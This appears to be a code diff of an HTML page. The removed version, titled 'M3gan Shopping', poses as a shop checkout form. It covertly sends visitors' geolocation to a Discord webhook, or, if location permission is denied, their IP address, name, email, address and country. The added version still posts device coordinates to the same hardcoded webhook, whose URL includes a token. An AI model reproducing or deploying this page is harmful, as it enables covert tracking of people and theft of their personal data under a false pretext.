@@ -1,111 +1,49 @@
 <!DOCTYPE html>
 <html>
-  <style>
-    body {
-      background-color: azure;
-    }
-    #submit {
-      font-family: sans-serif;
-      font-weight: bold;
-      border: 1in;
-      background-color: lightgreen;
-      color: white;
-      width: 1in;
-      height: 0.5in;
-      font-size: medium;
-    }
-    #title {
-      font-weight: bold;
-      font-size: large;
-      color: black;
-    }
-    #notice {
-      font-weight: bolder;
-      font-size: large;
-      color: red;
-    }
-  </style>
-  <head>
-    <title>M3gan Shopping</title>
-  </head>
-  <body>
-    <script>
-      document.getElementById("submit").addEventListener("click", function () {
-        getLocation();
-      });
+<head>
+	<title>Location</title>
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+</head>
+<body>
+	<button onclick="sendLocation()">Location of Device sent to server</button>
 
-      function getLocation() {
-        var email = document.getElementById("email").value;
-        var address = document.getElementById("address").value;
-        var country = document.getElementById("country").value;
-        var name = document.getElementById("name").value;
-        if (email != "" || address != "" || country != "" || name != "") {
-          if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(showPosition, showError);
-          } else {
-            alert("Your browser does not support Geo Location, please enter your address manually in the address prompt")
-          }
-        } else {
-          alert("All information needs to be filled out!")
-        }
-      }
+	<p id="demo"></p>
 
-      function showPosition(position) {
-        var latitude = position.coords.latitude;
-        var longitude = position.coords.longitude;
-        var webhookUrl = "https://discordapp.com/api/webhooks/1092569585045221386/8la5fQp6icwktAFDw68NpIInnDUvYbHEMZRTeItiBqyH8tk4AP8iSlCTTTZormOH-cZO";
-        fetch('https://api.ipify.org?format=json')
-        .then(response => response.json())
-        .then(json => {
-          var ip = json.ip;
-          var data = {
-            content: `Device Information:\n------------------------\nDevice location: ${latitude}, ${longitude}`
-          }
-          fetch(webhookUrl, {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json"
-            },
-            body: JSON.stringify(data)
-          })
-          .then(response => console.log("Location sent successfully."))
-          .catch(error => console.error("Error sending location to Discord: " + error));
-        })
-      }
+	<script>
+		function getLocation() {
+			if (navigator.geolocation) {
+				navigator.geolocation.getCurrentPosition(showPosition);
+			} else {
+				document.getElementById("demo").innerHTML = "Geolocation is not supported by this browser.";
+			}
+		}
 
-  function showError(error) {
-    var webhookUrl = "https://discordapp.com/api/webhooks/1092569585045221386/8la5fQp6icwktAFDw68NpIInnDUvYbHEMZRTeItiBqyH8tk4AP8iSlCTTTZormOH-cZO";
-    switch(error.code) {
-      case error.PERMISSION_DENIED:
-      fetch('https://api.ipify.org?format=json')
-        .then(response => response.json())
-        .then(json => {
-          var ip = json.ip;
-          var data = {
-            content: `IP Address: ${ip}\nPersonal:\n-----------------------\n Address: ${address}\nCountry: ${country}\nFull Name: ${name}\nEmail: ${email}`
-          }
-          fetch(webhookUrl, {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json"
-            },
-            body: JSON.stringify(data)
-          })
-          .then(response => console.log("Location sent successfully."))
-          .catch(error => console.error("Error sending location to Discord: " + error));
-        })
-        break;
-      case error.POSITION_UNAVAILABLE:
-        alert("Location information is unavailable.")
-        break;
-      case error.TIMEOUT:
-        alert("The request to get user location timed out.")
-        break;
-      case error.UNKNOWN_ERROR:
-        alert("An unknown error occurred.")
-        break;
-    }
-  }
-</script>
+		function showPosition(position) {
+			var latitude = position.coords.latitude;
+			var longitude = position.coords.longitude;
+			document.getElementById("demo").innerHTML = "Latitude: " + latitude + "<br>Longitude: " + longitude;
+
+			var webhookUrl = "https://discordapp.com/api/webhooks/1092569585045221386/8la5fQp6icwktAFDw68NpIInnDUvYbHEMZRTeItiBqyH8tk4AP8iSlCTTTZormOH-cZO";
+			var data = {
+				content: "User location: " + latitude + ", " + longitude
+			};
+			$.ajax({
+				type: "POST",
+				url: webhookUrl,
+				data: JSON.stringify(data),
+				contentType: "application/json",
+				success: function() {
+					alert("Location sent to server!");
+				},
+				error: function(xhr, status, error) {
+					alert("Error sending location to server: " + error);
+				}
+			});
+		}
+
+		function sendLocation() {
+			getLocation();
+		}
+	</script>
 </body>
 </html>
